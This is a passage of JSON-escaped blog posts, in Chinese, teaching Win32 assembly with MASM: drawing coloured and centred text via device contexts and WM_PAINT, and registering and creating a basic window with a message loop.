等GDI对象选进“设备环境”。该函数会返回一个旧的“设备环境”的句柄。您必须保存该句柄，以便在完成“绘制”工作后再把它选回。在调用 `SelectObject` 函数后一切的绘制函数都是针对该“设备环境”的。 \n\n```\nRGB 200，200，50\ninvoke SetTextColor，hdc，eax\nRGB 0，0，255 \ninvoke SetBkColor，hdc，eax\n```\n\n我们用宏 RGB 产生颜色，然后分别调用 `SetTextColor` 和 `SetBkColor`。\n\n```\ninvoke TextOut，hdc，0，0，ADDR TestString，SIZEOF TestString\n```\n\n我们调用 `TextOut` 在客户区用我们前面选定的字体和颜色“绘制”文本串。 `TextOut,hdc,x,y,lpString,nCount`\n\n```\ninvoke SelectObject，hdc， hfont\n```\n\n在我们“绘制”完成后，必须恢复“设备环境”。\n\n## 测试图\n![绘制有颜色的文本](http://ww1.sinaimg.cn/large/c0264382gy1fo9dl4zzhsj20u00hk0sw.jpg)\n","cover":"","link":"2018/02/08/win32-asm-5-draw-text.html","preview":"\u003cp\u003e这次我们将学习有关文本的诸多属性如字体和颜色等。\u003c/p\u003e\n","title":"Win32汇编学习(5)：绘制文本2"},{"content":"\n\n\n\n这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。\n\n## 理论：\n\n### “绘制”字符串\n\nWindows 中的文本是一个GUI（图形用户界面）对象。每一个字符实际上是由许多的像素点组成，这些点在有笔画的地方显示出来，这样就会出现字符。这也是为什么我说“绘制”字符，而不是写字符。通常您都是在您应用程序的客户区“绘制”字符串（尽管您也可以在客户区外“绘制”）。Windows 下的“绘制”字符串方法和 Dos 下的截然不同，在 Dos 下，您可以把屏幕想象成 85 x 25 的一个平面，而 Windows 下由于屏幕上同时有几个应用程序的画面，所以您必须严格遵从规范。Windows 通过把每一个应用程序限制在他的客户区来做到这一点。当然客户区的大小是可变的，您随时可以调整。\n\n在您在客户区“绘制”字符串前，您必须从 Windows 那里得到您客户区的大小，确实您无法像在 DOS 下那样随心所欲地在屏幕上任何地方“绘制”，绘制前您必须得到 Windows 的允许，然后 Windows 会告诉您客户区的大小，字体，颜色和其它 GUI 对象的属性。您可以用这些来在客户区“绘制”。\n\n### 设备环境\n\n什么是“设备环境”（DC）呢？ 它其实是由 Windows 内部维护的一个数据结构。一个“设备环境”和一个特定的设备相连。像打印机和显示器。对于显示器来说，“设备环境”和一个个特定的窗口相连。\n\n“设备环境”中的有些属性和绘图有关，像：颜色，字体等。您可以随时改动那些缺省值，之所以保存缺省值是为了方便。您可以把“设备环境”想象成是Windows 为您准备的一个绘图环境，而您可以随时根据需要改变某些缺省属性。\n\n当应用程序需要绘制时，您必须得到一个“设备环境”的句柄。通常有几种方法。\n\n- 在 `WM_PAINT` 消息中使用 `call BeginPaint`\n- 在其他消息中使用 `call GetDC`\n- `call CreateDC` 建立你自己的 DC\n\n您必须牢记的是，**在处理单个消息后你必须释放“设备环境”句柄**。不要在一个消息处理中获得 “设备环境”句柄，而在另一个消息处理中在释放它。\n\n我们在Windows 发送 `WM_PAINT` 消息时处理绘制客户区，Windows 不会保存客户区的内容，它用的是方法是“重绘”机制（譬如当客户区刚被另一个应用程序的客户区覆盖），Windows 会把 `WM_PAINT` 消息放入该应用程序的消息队列。重绘窗口的客户区是各个窗口自己的责任，您要做的是在窗口过程处理 WM_PAINT 的部分知道绘制什么和何如绘制。 \n\n您必须了解的另一个概念是“无效区域”。Windows 把一个最小的需要重绘的正方形区域叫做“无效区域”。当 Windows 发现了一个”无效区域“后，它就会向该应用程序发送一个 `WM_PAINT` 消息，在 `WM_PAINT` 的处理过程中，窗口首先得到一个有关绘图的结构体，里面包括无效区的坐标位置等。您可以通过调用 `BeginPaint` 让“无效区”有效，**如果您不处理 `WM_PAINT` 消息，至少要调用缺省的窗口处理函数 `DefWindowProc` ，或者调用 `ValidateRect` 让“无效区”有效。否则您的应用程序将会收到无穷无尽的 `WM_PAINT` 消息。**\n\n下面是响应该消息的步骤： \n\n1. 取得“设备环境”句柄 \n2. 绘制客户区 \n3. 释放“设备环境”句柄 \n\n注意，您无须显式地让“无效区”有效，这个动作由 `BeginPaint` 自动完成。您可以在 `BeginPaint` 和 `Endpaint` 之间，调用所有的绘制函数。几乎所有的 GDI 函数都需要“设备环境”的句柄作为参数。\n\n## 内容： \n\n我们将写一个应用程序，它会在客户区的中心显示一行 \"Win32 汇编非常有意思\"\n\n```asm\n.386 \n.model flat,stdcall \noption casemap:none \n\nWinMain proto :DWORD,:DWORD,:DWORD,:DWORD \n\ninclude \\masm32\\include\\windows.inc \ninclude \\masm32\\include\\user32.inc \nincludelib \\masm32\\lib\\user32.lib \ninclude \\masm32\\include\\kernel32.inc \nincludelib \\masm32\\lib\\kernel32.lib \n\n.DATA \nClassName db \"SimpleWinClass\",0 \nAppName  db \"Our Second Window\",0 \nOurText  db \"Win32 汇编非常有意思\",0 \n\n.DATA? \nhInstance HINSTANCE ? \nCommandLine LPSTR ? \n\n.CODE \nstart: \n    invoke GetModuleHandle, NULL \n    mov    hInstance,eax \n    invoke GetCommandLine\n    mov CommandLine,eax\n    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT \n    invoke ExitProcess,eax \n\nWinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD \n    LOCAL wc:WNDCLASSEX \n    LOCAL msg:MSG \n    LOCAL hwnd:HWND \n    mov   wc.cbSize,SIZEOF WNDCLASSEX \n    mov   wc.style, CS_HREDRAW or CS_VREDRAW \n    mov   wc.lpfnWndProc, OFFSET WndProc \n    mov   wc.cbClsExtra,NULL \n    mov   wc.cbWndExtra,NULL \n    push  hInst \n    pop   wc.hInstance \n    mov   wc.hbrBackground,COLOR_WINDOW+1 \n    mov   wc.lpszMenuName,NULL \n    mov   wc.lpszClassName,OFFSET ClassName \n    invoke LoadIcon,NULL,IDI_APPLICATION \n    mov   wc.hIcon,eax \n    mov   wc.hIconSm,eax \n    invoke LoadCursor,NULL,IDC_ARROW \n    mov   wc.hCursor,eax \n    invoke RegisterClassEx, addr wc \n    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ \n           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ \n           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\\ \n           hInst,NULL \n    mov   hwnd,eax \n    invoke ShowWindow, hwnd,SW_SHOWNORMAL \n    invoke UpdateWindow, hwnd \n        .WHILE TRUE \n                invoke GetMessage, ADDR msg,NULL,0,0 \n                .BREAK .IF (!eax) \n                invoke TranslateMessage, ADDR msg \n                invoke DispatchMessage, ADDR msg \n        .ENDW \n        mov     eax,msg.wParam \n        ret \nWinMain endp \n\nWndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM \n    LOCAL hdc:HDC \n    LOCAL ps:PAINTSTRUCT \n    LOCAL rect:RECT \n    .IF uMsg==WM_DESTROY \n        invoke PostQuitMessage,NULL \n    .ELSEIF uMsg==WM_PAINT \n        invoke BeginPaint,hWnd, ADDR ps \n        mov    hdc,eax \n        invoke GetClientRect,hWnd, ADDR rect \n        invoke DrawText, hdc,ADDR OurText,-1, ADDR rect, \\ \n                DT_SINGLELINE or DT_CENTER or DT_VCENTER \n        invoke EndPaint,hWnd, ADDR ps \n    .ELSE \n        invoke DefWindowProc,hWnd,uMsg,wParam,lParam \n        ret \n    .ENDIF \n    xor   eax, eax \n    ret \nWndProc endp \nend start \n```\n\n## 分析： \n\n这里的大多数代码和`Win32汇编学习(3)：简单的窗口`中的一样。我只解释其中一些不相同的地方。\n\n```asm\nLOCAL hdc：HDC\nLOCAL ps：PAINTSTRUCT\nLOCAL rect：RECT\n```\n\n这些局部变量由处理 `WM_PAINT` 消息中的 GDI 函数调用。`hdc` 用来存放调用 `BeginPaint` 返回的“设备环境”句柄。`ps` 是一个 `PAINTSTRUCT` 数据类型的变量。通常您不会用到其中的许多值，它由 Windows 传递给 `BeginPaint`，在结束绘制后再原封不动的传递给 `EndPaint`。`rect` 是一个 `RECT` 结构体类型参数，它的定义如下：\n\n```\nRECT Struct left LONG ?\ntop LONG ?\nright LONG ?\nbottom LONG ?\nRECT ends\n```\n\nleft 和 top 是正方形左上角的坐标。right 和 bottom 是正方形右下角的坐标。客户区的左上角的坐标是 x=0，y=0，这样对于 x=0，y=10 的坐标点就在它的下面。\n\n```asm\ninvoke BeginPaint，hWnd， ADDR ps\nmov hdc，eax\ninvoke GetClientRect，hWnd， ADDR rect\ninvoke DrawText， hdc，ADDR OurText，-1， ADDR rect， \\ \nDT_SINGLELINE or DT_CENTER or DT_VCENTER\ninvoke EndPaint，hWnd， ADDR ps\n```\n\n在处理 `WM_PAINT` 消息时，您调用`BeginPaint`函数，传给它一个窗口句柄和未初始化的 `PAINTSTRUCT` 型参数。调用成功后在 eax 中返回“设备环境”的句柄。下一次，调用 `GetClientRect` 以得到客户区的大小，大小放在 `rect` 中，然后把它传给 `DrawText`。`DrawText` 的语法如下： \n\n```\nDrawText proto hdc：HDC， lpString：DWORD， nCount：DWORD， lpRect：DWORD， uFormat：DWORD \n```\n\n`DrawText`是一个高层的调用函数。它能自动处理像换行、把文本放到客户区中间等这些杂事。所以您只管集中精力“绘制”字符串就可以了。让我们来看一看该函数的参数： \n\n- `hdc`： “设备环境”的句柄。 \n- `lpString`：要显示的文本串，该文本串要么以NULL结尾，要么在nCount中指出它的长短。 \n- `nCount`：要输出的文本的长度。若以NULL结尾，该参数必须是-1。 \n- `lpRect`： 指向要输出文本串的正方形区域的指针，该方形必须是一个裁剪区，也就是说超过该区域的字符将不能显示。 \n- `uFormat`：指定如何显示。我们可以用 or 把以下标志或到一块： \n  - DT_SINGLELINE：是否单行显示。 \n  - DT_CENTER：是否水平居中。 \n  - DT_VCENTER ：是否垂直居中。 \n \n\n结束绘制后，必须调用 `EndPaint` 释放“设备环境”的句柄。 好了，现在我们把“绘制”文本串的要点总结如下：\n\n1. 必须在开始和结束处分别调用 `BeginPaint` 和 `EndPaint`； \n2. 在 `BeginPaint` 和 `EndPaint` 之间调用所有的绘制函数； \n3. 如果在其它的消息处理中重新绘制客户区，您可以有两种选择：\n   - 用`GetDC`和`ReleaseDC`代替`BeginPaint`和`EndPaint`；\n   - 调用`InvalidateRect`或`UpdateWindow`让客户区无效，这将迫使WINDOWS把`WM_PAINT`放入应用程序消息队列，从而使得客户区重绘。\n","cover":"","link":"2018/02/07/win32-asm-4-draw-text.html","preview":"\u003cp\u003e这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。\u003c/p\u003e\n","title":"Win32汇编学习(4)：绘制文本"},{"content":"\n\n\n\n这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。\n\n\n## 理论：\n\nWindows 程序中，在写图形用户界面时需要调用大量的标准 Windows Gui 函数。其实这对用户和程序员来说都有好处，对于用户，面对的是同一套标准的窗口，对这些窗口的操作都是一样的，所以使用不同的应用程序时无须重新学习操作。对程序员来说，这些 Gui 源代码都是经过了微软的严格测试，随时拿来就可以用的。当然至于具体地写程序对于程序员来说还是有难度的。为了创建基于窗口的应用程序，必须严格遵守规范。做到这一点并不难，只要用模块化或面向对象的编程方法即可。\n\n下面我就列出在桌面显示一个窗口的几个步骤：\n\n1. 得到您应用程序的句柄(必需)； \n2. 得到命令行参数(如果您想从命令行得到参数，可选)； \n3. 注册窗口类(必需，除非您使用 Windows 预定义的窗口类，如 MessageBox 或 dialog box； \n4. 产生窗口(必需)； \n5. 在桌面显示窗口(必需，除非您不想立即显示它)； \n6. 刷新窗口客户区； \n7. 进入无限的获取窗口消息的循环； \n8. 如果有消息到达，由负责该窗口的窗口回调函数处理； \n9. 如果用户关闭窗口，进行退出处理。 \n\n相对于单用户的 DOS 下的编程来说，Windows 下的程序框架结构是相当复杂的。但是 Windows 和 DOS 在系统架构上是截然不同的。Windows 是一个多任务的操作系统，故系统中同时有多个应用程序彼此协同运行。这就要求 Windows 程序员必须严格遵守编程规范，并养成良好的编程风格。\n\n## 内容：\n\n下面是我们简单的窗口程序的源代码。在进入复杂的代码前，指出几点要点：\n\n- 您应当把程序中要用到的所有常量和结构体的声明放到一个头文件中，并且在源程序的开始处包含这个头文件。这么做将会节省您大量的时间，也免得一次又一次的敲键盘。目前，我所使用的是[masm32.com](http://masm32.com/)提供的。您也可以定义您自己的常量和结构体，但最好把它们放到独立的头文件中 \n- 用 includelib 指令，包含您的程序要引用的库文件，譬如：若您的程序要调用 \"MessageBox\"， 您就应当在源文件中加入如下一行： includelib user32.lib 这条语句告诉 MASM 您的程序将要用到一些引入库。如果您不止引用一个库，只要简单地加入 includelib 语句，不要担心链接器如何处理这么多的库，只要在链接时用链接开关 /LIBPATH 指明库所在的路径即可。 \n- 在其它地方运用头文件中定义函数原型，常数和结构体时，要严格保持和头文件中的定义一致，包括大小写。在查询函数定义时，这将节约您大量的时间； \n- 在编译，链接时用makefile文件，免去重复敲键。 \n\n```\n.386 \n.model flat,stdcall \noption casemap:none \ninclude windows.inc \ninclude user32.inc \nincludelib user32.lib            ; calls to functions in user32.lib and kernel32.lib \ninclude kernel32.inc \nincludelib kernel32.lib \n\nWinMain proto :DWORD,:DWORD,:DWORD,:DWORD \n\n.DATA                     ; initialized data \nClassName db \"SimpleWinClass\",0        ; the name of our window class \nAppName db \"Our First Window\",0        ; the name of our window \n\n.DATA?                ; Uninitialized data \nhInstance HINSTANCE ?        ; Instance handle of our program \nCommandLine LPSTR ? \n.CODE                ; Here begins our code \nstart: \ninvoke GetModuleHandle, NULL            ; get the instance handle of our program. \n                                                                       ; Under Win32, hmodule==hinstance mov hInstance,eax \nmov hInstance,eax \ninvoke GetCommandLine                        ; get the command line. You don't have to call this function IF \n                                                                       ; your program doesn't process the command line. \nmov CommandLine,eax \ninvoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT        ; call the main function \ninvoke ExitProcess, eax                           ; quit our program. The exit code is returned in eax from WinMain. \n\nWinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD \n    LOCAL wc:WNDCLASSEX                                            ; create local variables on stack \n    LOCAL msg:MSG \n    LOCAL hwnd:HWND \n\n    mov   wc.cbSize,SIZEOF WNDCLASSEX                   ; fill values in members of wc \n    mov   wc.style, CS_HREDRAW or CS_VREDRAW \n    mov   wc.lpfnWndProc, OFFSET WndProc \n    mov   wc.cbClsExtra,NULL \n    mov   wc.cbWndExtra,NULL \n    push  hInstance \n    pop   wc.hInstance \n    mov   wc.hbrBackground,COLOR_WINDOW+1 \n    mov   wc.lpszMenuName,NULL \n    mov   wc.lpszClassName,OFFSET ClassName \n    invoke LoadIcon,NULL,IDI_APPLICATION \n    mov   wc.hIcon,eax \n    mov   wc.hIconSm,eax \n    invoke LoadCursor,NULL,IDC_ARROW \n    mov   wc.hCursor,eax \n    invoke RegisterClassEx, addr wc                       ; register our window class \n    invoke CreateWindowEx,NULL,\\ \n                ADDR ClassName,\\ \n                ADDR AppName,\\ \n                WS_OVERLAPPEDWINDOW,\\ \n                CW_USEDEFAULT,\\ \n                CW_USEDEFAULT,\\ \n                CW_USEDEFAULT,\\ \n                CW_USEDEFAULT,\\ \n                NULL,\\ \n                NULL,\\ \n                hInst,\\ \n                NULL \n    mov   hwnd,eax \n    invoke ShowWindow, hwnd,CmdShow               ; display our window on desktop \n    invoke UpdateWindow, hwnd                                 ; refresh the client area \n\n    .WHILE TRUE                                                         ; Enter message loop \n                invoke GetMessage, ADDR msg,NULL,0,0 \n                .BREAK .IF (!eax) \n                invoke TranslateMessage, ADDR msg \n                invoke DispatchMessage, ADDR msg \n   .ENDW \n    mov     eax,msg.wParam                                            ; return exit code in eax \n    ret \nWinMain endp \n\nWndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM \n    .IF uMsg==WM_DESTROY                           ; if the user closes our window \n        invoke PostQuitMessage,NULL             ; quit our application \n    .ELSE \n        invoke DefWindowProc,hWnd,uMsg,wParam,lParam     ; Default message processing \n        ret \n    .ENDIF \n    xor eax,eax \n    ret \nWndProc endp \n\nend start \n```\n\n## 分析：\n\n看到一个简单的 Windows 程序有这么多行，您是不是有点想死? 但是您必须要知道的是上面的大多数代码都是模板而已，模板的意思即是指这些代码对差不多所有标准 Windows 程序来说都是相同的。在写 Windows 程序时您可以把这些代码拷来拷去，当然把这些重复的代码写到一个库中也挺好。其实真正要写的代码集中在 WinMain 中。这和一些 C 编译器一样，无须要关心其它杂务，集中精力于 WinMain 函数。**唯一不同的是 C 编译器要求您的源代码有必须有一个函数叫 WinMain。否则 C 无法知道将哪个函数和有关的前后代码链接。相对C，汇编语言提供了较大的灵活性，它不强行要求一个叫 WinMain 的函数。**\n\n做好心理准备，下面我们开始分析代码。\n\n```\n.386\n.model flat，stdcall\noption casemap：none\n\nWinMain proto ：DWORD，：DWORD，：DWORD，：DWORD\n\ninclude windows.inc\ninclude user32.inc\ninclude kernel32.inc\nincludelib user32.lib\nincludelib kernel32.lib \n```\n\n您可以把前三行看成是\"必须\"的.\n\n`.386`告诉MASN我们要用80386指令集。  \n`. model flat，stdcall`告诉MASM 我们用的内存寻址模式，此处也可以加入stdcall告诉MASM我们所用的参数传递约定。  \n\n接下来是函数 WinMain 的原型声明，因为我们稍后要用到该函数，故必须先声明。我们必须包含 window.inc 文件，因为其中包含大量要用到的常量和结构的定义，该文件是一个文本文件，您可以用任何文本编辑器打开并且查看它\n\n我们的程序调用 user32.dll (譬如：CreateWindowEx， RegisterWindowClassEx) 和 kernel32.dll (ExitProcess)中的函数，所以必须链接这两个库。接下来我如果问：您需要把什么库链入您的程序呢 ? 答案是：先查到您要调用的函数在什么库中，然后包含进来。譬如：若您要调用的函数在 gdi32.dll 中，您就要包含gdi32.inc头文件。和 MASM 相比，TASM 则要简单得多，您只要引入一个库，即：import32.lib。\u003c但 Tasm5 麻烦的是 windows.inc 非常的不全面，而且如果在 Windows.inc 中包含全部的 API 定义会内存不够，所以每次你得把用到的 API 定义拷贝出来\u003e\n\n```\n.DATA\n\nClassName db \"SimpleWinClass\"，0 \nAppName db \"Our First Window\"，0\n\n.DATA?\n\nhInstance HINSTANCE ?\nCommandLine LPSTR ?\n```\n\n接下来是`DATA`\"分段\"。 在 .DATA 中我们定义了两个以 NULL 结尾的字符串 (ASCIIZ)：其中 ClassName 是 Windows 类名，AppName 是我们窗口的名字。这两个变量都是初始化了的。未进行初始化的两个变量放在 `.DATA?` \"分段\"中，其中 hInstance 代表应用程序的句柄，CommandLine 保存从命令行传入的参数。HINSTACE 和 LPSTR 是两个数据类型名，它们在头文件中定义，可以看做是 DWORD 的别名，之所以要这么重新定仅是为了易记。您可以查看 windows.inc 文件，在 .DATA? 中的变量都是未经初始化的，这也就是说在程序刚启动时它们的值是什么无关紧要，只不过占有了一块内存，以后可以再利用而已。\n\n```\n.CODE\nstart：\ninvoke GetModuleHandle， NULL\nmov hInstance，eax\ninvoke GetCommandLine\nmov CommandLine，eax\ninvoke WinMain， hInstance，NULL，CommandLine， SW_SHOWDEFAULT\ninvoke ExitProcess，eax\n.....\nend start\n```\n\n`.CODE` \"分段\"包含了您应用程序的所有代码，这些代码必须都在 .code 和 end 之间。至于 label 的命名只要遵从 Windows 规范而且保证唯一则具体叫什么倒是无所谓。我们程序的第一条语句是调用 GetModuleHandle 去查找我们应用程序的句柄。在Win32下，应用程序的句柄和模块的句柄是一样的。您可以把实例句柄看成是您的应用程序的 ID 号。我们在调用几个函数是都把它作为参数来进行传递，所以在一开始便得到并保存它就可以省许多的事。\n\n特别注意：WIN32下的实例句柄实际上是您应用程序在内存中的线性地址。\n\n**WIN32 中函数的函数如果有返回值，那它是通过 eax 寄存器来传递的。其他的值可以通过传递进来的参数地址进行返回。**一个 WIN32 函数被调用时总会保存好段寄存器和 ebx，edi，esi和ebp 寄存器，而 ecx和edx 中的值总是不定的，不能在返回时应用。特别注意：从 Windows API 函数中返回后，eax，ecx，edx 中的值和调用前不一定相同。当函数返回时，返回值放在eax中。如果您应用程序中的函数提供给 Windows 调用时，也必须遵守这一点，即在函数入口处保存段寄存器和 ebx，esp，esi，edi 的值并在函数返回时恢复。如果不这样一来的话，您的应用程序很快会崩溃。从您的程序中提供给 Windows 调用的函数大体上有两种：Windows 窗口过程和 Callback 函数。\n\n如果您的应用程序不处理命令行那么就无须调用 GetCommandLine，这里只是告诉您如果要调用应该怎么做。 \n\n下面则是调用WinMain了。该函数共有4个参数：应用程序的实例句柄，该应用程序的前一实例句柄，命令行参数串指针和窗口如何显示。Win32 没有前一实例句柄的概念，所以第二个参数总为0。之所以保留它是为了和 Win16 兼容的考虑，在 Win16下，如果 hPrevInst 是 NULL，则该函数是第一次运行。特别注意：您不用必须声明一个名为 WinMain 函数，事实上在这方面您可以完全作主，您甚至无须有一个和 WinMain 等同的函数。您只要把 WinMain 中的代码拷到GetCommandLine 之后，其所实现的功能完全相同。在 WinMain 返回时，把返回码放到 eax 中。然后在应用程序结束时通过 ExitProcess 函数把该返回码传递给 Windows 。 \n\n```\nWinMain proc Inst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD \n```\n\n上面是WinMain的定义。注意跟在 proc 指令后的parameter：type形式的参数，它们是由调用者传给 WinMain 的，我们引用是直接用参数名即可。至于压栈和退栈时的平衡堆栈工作由 MASM 在编译时加入相关的前序和后序汇编指令来进行。 `LOCAL wc：WNDCLASSEX LOCAL msg：MSG LOCAL hwnd：HWND LOCAL` 伪指令为局部变量在栈中分配内存空间，所有的 LOCAL 指令必须紧跟在 PROC 之后。LOCAL 后跟声明的变量，其形式是 变量名:变量类型。譬如 `LOCAL wc：WNDCLASSEX` 即是告诉 MASM 为名字叫 wc 的局部边量在栈中分配长度为 WNDCLASSEX 结构体长度的内存空间，然后我们在用该局部变量是无须考虑堆栈的问题，考虑到 DOS 下的汇编，这不能不说是一种恩赐。不过这就要求这样声明的局部变量在函数结束时释放栈空间，(也即不能在函数体外被引用)，另一个缺点是您因不能初始化您的局部变量，不得不在稍后另外再对其赋值。\n\n```\nmov wc.cbSize，SIZEOF WNDCLASSEX\nmov wc.style， CS_HREDRAW or CS_VREDRAW\nmov wc.lpfnWndProc， OFFSET WndProc\nmov wc.cbClsExtra，NULL\nmov wc.cbWndExtra，NULL\npush hInstance\npop wc.hInstance\nmov wc.hbrBackground，COLOR_WINDOW+1 \nmov wc.lpszMenuName，NULL\nmov wc.lpszClassName，OFFSET ClassName \ninvoke LoadIcon，NULL，IDI_APPLICATION\nmov wc.hIcon，eax\nmov wc.hIconSm，eax\ninvoke LoadCursor，NULL，IDC_ARROW\nmov wc.hCursor，eax invoke \nRegisterClassEx， addr w \n```\n\n上面几行从概念上说确实是非常地简单。只要几行指令就可以实现。其中的主要概念就是窗口类（window class），一个窗口类就是一个有关窗口的规范，这个规范定义了几个主要的窗口的元素，如：图标、光标、背景色、和负责处理该窗口的函数。您产生一个窗口时就必须要有这样的一个窗口类。如果您要产生不止一个同种类型的窗口时，最好的方法就是把这个窗口类存储起来，这种方法可以节约许多的内存空间。也许今天您不会太感觉到，可是想想以前 PC 大多数只有 1M 内存时，这么做是非常有必要的。如果您要定义自己的创建窗口类就必须：在一个 WINDCLASS 或 WINDOWCLASSEXE 结构体中指明您窗口的组成元素，然后调用 RegisterClass 或 RegisterClassEx ，再根据该窗口类产生窗口。对不同特色的窗口必须定义不同的窗口类。 WINDOWS有几个预定义的窗口类，譬如：按钮、编辑框等。要产生该种风格的窗口无须预先再定义窗口类了，只要包预定义类的类名作为参数调用 CreateWindowEx 即可。\n\nWNDCLASSEX 中最重要的成员莫过于lpfnWndProc了。前缀 lpfn 表示该成员是一个指向函数的长指针。在 Win32中由于内存模式是 FLAT 型，所以没有 near 或 far 的区别。每一个窗口类必须有一个窗口过程，当 Windows 把属于特定窗口的消息发送给该窗口时，该窗口的窗口类负责处理所有的消息，如键盘消息或鼠标消息。由于窗口过程差不多智能地处理了所有的窗口消息循环，所以您只要在其中加入消息处理过程即可。下面我将要讲解 WNDCLASSEX 的每一个成员\n\n```\nWNDCLASSEX STRUCT DWORD \n  cbSize            DWORD      ? \n  style             DWORD      ? \n  lpfnWndProc       DWORD      ? \n  cbClsExtra        DWORD      ? \n  cbWndExtra        DWORD      ? \n  hInstance         DWORD      ? \n  hIcon             DWORD      ? \n  hCursor           DWORD      ? \n  hbrBackground     DWORD      ? \n  lpszMenuName      DWORD      ? \n  lpszClassName     DWORD      ? \n  hIconSm           DWORD      ? \nWNDCLASSEX ENDS \n```\n\n- `cbSize`：WNDCLASSEX 的大小。我们可以用sizeof（WNDCLASSEX）来获得准确的值。 \n- `style`：从这个窗口类派生的窗口具有的风格。您可以用“or”操作符来把几个风格或到一起。 \n- `lpfnWndProc`：窗口处理函数的指针。 \n- `cbClsExtra`：指定紧跟在窗口类结构后的附加字节数。 \n- `cbWndExtra`：指定紧跟在窗口事例后的附加字节数。如果一个应用程序在资源中用CLASS伪指令注册一个对话框类时，则必须把这个成员设成DLGWINDOWEXTRA。 \n- `hInstance`：本模块的事例句柄。 \n- `hIcon`：图标的句柄。 \n- `hCursor`：光标的句柄。 \n- `hbrBackground`：背景画刷的句柄。 \n- `lpszMenuName`：指向菜单的指针。 \n- `lpszClassName`：指向类名称的指针。 \n- `hIconSm`：和窗口类关联的小图标。如果该值为NULL。则把hCursor中的图标转换成大小合适的小图标。 \n\n```\ninvoke CreateWindowEx， NULL，\\\nADDR ClassName，\\\nADDR AppName，\\\nWS_OVERLAPPEDWINDOW，\\\nCW_USEDEFAULT，\\\nCW_USEDEFAULT，\\\nCW_USEDEFAULT，\\\nCW_USEDEFAULT，\\ \nNULL，\\ \nNULL，\\\nhInst，\\\nNULL \n```\n\n注册窗口类后，我们将调用`CreateWindowEx`来产生实际的窗口。请注意该函数有12个参数。 \n\n```\nCreateWindowExA proto dwExStyle：DWORD，\\\nlpClassName：DWORD，\\\nlpWindowName：DWORD，\\ \ndwStyle：DWORD，\\\nX：DWORD，\\\nY：DWORD，\\\nnWidth：DWORD，\\\nnHeight：DWORD，\\\nhWndParent：DWORD ，\\\nhMenu：DWORD，\\ \nhInstance：DWORD，\\\nlpParam：DWORD\n```\n\n我们来仔细看一看这些的参数：\n\n- `dwExStyle`：附加的窗口风格。相对于旧的CreateWindow这是一个新的参数。在9X/NT中您可以使用新的窗口风格。您可以在Style中指定一般的窗口风格，但是一些特殊的窗口风格，如顶层窗口则必须在此参数中指定。如果您不想指定任何特别的风格，则把此参数设为NULL。 \n- `lpClassName`：（必须）。ASCIIZ形式的窗口类名称的地址。可以是您自定义的类，也可以是预定义的类名。像上面所说，每一个应用程序必须有一个窗口类。 \n- `lpWindowName`：ASCIIZ形式的窗口名称的地址。该名称会显示在标题条上。如果该参数空白，则标题条上什么都没有。 \n- `dwStyle`：窗口的风格。在此您可以指定窗口的外观。可以指定该参数为零，但那样该窗口就没有系统菜单，也没有最大化和最小化按钮，也没有关闭按钮，那样您不得不按Alt+F4 来关闭它。最为普遍的窗口类风格是 `WS_OVERLAPPEDWINDOW`。 一种窗口风格是一种按位的掩码，这样您可以用`or`把您希望的窗口风格或起来。像 `WS_OVERLAPPEDWINDOW` 就是由几种最为普遍的风格`or`起来的。 \n- `X`，`Y`： 指定窗口左上角的以像素为单位的屏幕坐标位置。缺省地可指定为 `CW_USEDEFAULT`，这样 Windows 会自动为窗口指定最合适的位置。 \n- `nWidth`，`nHeight`： 以像素为单位的窗口大小。缺省地可指定为 `CW_USEDEFAULT`，这样 Windows 会自动为窗口指定最合适的大小。 \n- `hWndParent`： 父窗口的句柄（如果有的话）。这个参数告诉 Windows 这是一个子窗口和他的父窗口是谁。这和 MDI（多文档结构）不同，此处的子窗口并不会局限在父窗口的客户区内。他只是用来告诉 Windows 各个窗口之间的父子关系，以便在父窗口销毁是一同把其子窗口销毁。在我们的例子程序中因为只有一个窗口，故把该参数设为 NULL。 \n- `hMenu`： WINDOWS菜单的句柄。如果只用系统菜单则指定该参数为NULL。回头看一看`WNDCLASSEX` 结构中的 `lpszMenuName` 参数，它也指定一个菜单，这是一个缺省菜单，任何从该窗口类派生的窗口若想用其他的菜单需在该参数中重新指定。其实该参数有双重意义：一方面若这是一个自定义窗口时该参数代表菜单句柄，另一方面，若这是一个预定义窗口时，该参数代表是该窗口的 ID 号。Windows 是根据`lpClassName` 参数来区分是自定义窗口还是预定义窗口的。 \n- `hInstance`： 产生该窗口的应用程序的实例句柄。 \n- `lpParam`： （可选）指向欲传给窗口的结构体数据类型参数的指针。如在MDI中在产生窗口时传递 CLIENTCREATESTRUCT 结构的参数。一般情况下，该值总为零，这表示没有参数传递给窗口。可以通过GetWindowLong 函数检索该值。 \n\n```\nmov hwnd，eax\ninvoke ShowWindow， hwnd，CmdShow\ninvoke UpdateWindow， hwnd\n```\n\n调用`CreateWindowEx`成功后，窗口句柄在eax中。我们必须保存该值以备后用。我们刚刚产生的窗口不会自动显示，所以必须调用 `ShowWindow` 来按照我们希望的方式来显示该窗口。接下来调用 `UpdateWindow` 来更新客户区。 \n\n```\n.WHILE TRUE\ninvoke GetMessage， ADDR msg，NULL，0，0\n.BREAK .IF (!eax)\ninvoke TranslateMessage， ADDR msg \ninvoke DispatchMessage， ADDR msg\n.ENDW\n```\n\n这时候我们的窗口已显示在屏幕上了。但是它还不能从外界接收消息。所以我们必须给它提供相关的消息。我们是通过一个**消息循环**来完成该项工作的。每一个模块仅有一个消息循环，我们不断地调用 `GetMessage` 从 Windows 中获得消息。`GetMessage` 传递一个 MSG 结构体给 Windows ，然后 Windows 在该函数中填充有关的消息，一直到 Windows 